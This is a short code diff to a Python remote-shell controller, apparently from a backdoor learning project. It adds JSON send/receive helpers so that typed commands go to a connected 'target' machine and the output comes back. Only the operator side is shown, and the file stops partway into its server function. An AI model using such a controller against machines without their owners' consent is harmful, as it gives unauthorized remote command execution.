@@ -1,15 +1,30 @@
 #!/usr/bin/python
 
 import socket
+import json
+from ctypes.wintypes import tagRECT
 
+
+def send_j(data):
+    json_data = json.dumps(data)
+    target.send(json_data.encode('utf-8'))
+
+def recv_j():
+        data = ""
+        while True:
+            try:
+                data = data + target.recv(1024).decode('utf-8') #receiving chunks of 1024 bytes until json.loads(data) returns a correct json format
+                return json.loads(data) #
+            except ValueError: #if the output of json.loads(data) is not complete (not in json format)
+                continue
 def shell():
     while True:
         cmd = input("# ")
-        target.send(cmd.encode('utf-8')) # send command to client
-        if cmd == "exit":
+        send_j(cmd) # send command to client
+        if cmd == "exit_server":
             break
-        output = target.recv(1024) #receive output from client
-        print(output.decode('utf-8'))
+        output = recv_j() #receive output from client "target"
+        print(output)
 
 def server():
     global s
